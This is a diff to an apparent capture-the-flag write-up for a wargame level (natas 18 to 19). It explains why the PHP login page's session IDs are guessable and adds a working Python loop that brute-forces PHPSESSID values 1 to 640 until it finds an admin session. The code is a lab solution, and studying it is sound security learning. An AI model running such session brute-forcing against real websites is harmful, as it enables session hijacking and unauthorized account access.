@@ -52,8 +52,18 @@ Second, and more important, the login flow itself:
 
 `createID()` completely ignores the username and just returns `rand(1, 640)` — the session ID handed out on login has nothing to do with the credentials submitted. More importantly, `my_session_start()` runs on *every* page load, before any login attempt — if it finds an existing session with `$_SESSION["admin"]` already true, it prints the credentials immediately, no login needed at all. Since session IDs only span 1–640, that's a small enough range to just try every possible `PHPSESSID` cookie value directly against the page and see which ones land on an already-admin session:
 
-    for session_id in range(1, maxid + 1):
-        requests.get(URL, cookies={"PHPSESSID": str(session_id)})
+    for session_id in range(1, 641):
+        cookies = {"PHPSESSID": str(session_id)}
+        r = requests.get(url, auth=auth, cookies=cookies)
+
+        if "You are an admin" in r.text:
+            print(f"[+] Admin session found: {session_id}")
+            print(r.text)
+            break
+
+        print(f"[-] Tried session {session_id}")
+
+![Script looping PHPSESSID from 1 to 640 and checking each response for "You are an admin"](images/natas-18-19-solve-script.png)
 
 ![Terminal starting the brute-force, trying session IDs 1 through 6](images/natas-18-19-run-start.png)
 
